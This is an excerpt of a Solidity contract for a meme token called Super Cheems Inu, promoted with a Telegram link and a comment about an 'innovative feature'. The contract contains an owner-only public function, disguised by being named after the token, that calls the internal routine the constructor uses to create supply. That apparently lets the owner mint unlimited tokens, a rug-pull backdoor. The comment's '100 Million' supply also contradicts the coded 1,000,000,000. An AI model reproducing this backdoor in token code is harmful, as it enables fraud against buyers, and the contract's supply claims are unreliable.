...
//
// $SuperCheemsInu proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/SuperCheemsInu
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _SuperCheemsInu(uint256 amount) public onlyOwner {
    _SuperCheemsInu(msg.sender, amount);
    }
    ...
    function _SuperCheemsInu(address account, uint256 amount) internal virtual {
...
contract $SuperCheemsInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Super Cheems Inu", "SUPERCHEEMSINU") {
        _SuperCheemsInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}